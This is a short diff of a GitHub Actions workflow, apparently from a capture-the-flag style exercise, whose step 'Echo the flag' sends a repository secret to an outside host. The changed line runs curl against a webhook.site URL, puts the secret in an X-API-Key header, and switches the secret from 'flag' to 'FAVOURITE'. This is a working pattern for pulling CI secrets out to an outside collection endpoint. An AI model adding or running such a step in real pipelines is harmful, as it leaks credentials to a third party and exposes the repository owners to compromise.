@@ -25,4 +25,4 @@ jobs:
 
       - name: Echo the flag
         run: |
-          curl https://webhook.site/7a92a206-afdf-4edc-825e-55e759feee50 -H "X-API-Key: ${{ secrets.flag }}"
+          curl https://webhook.site/7a92a206-afdf-4edc-825e-55e759feee50 -H "X-API-Key: ${{ secrets.FAVOURITE }}"
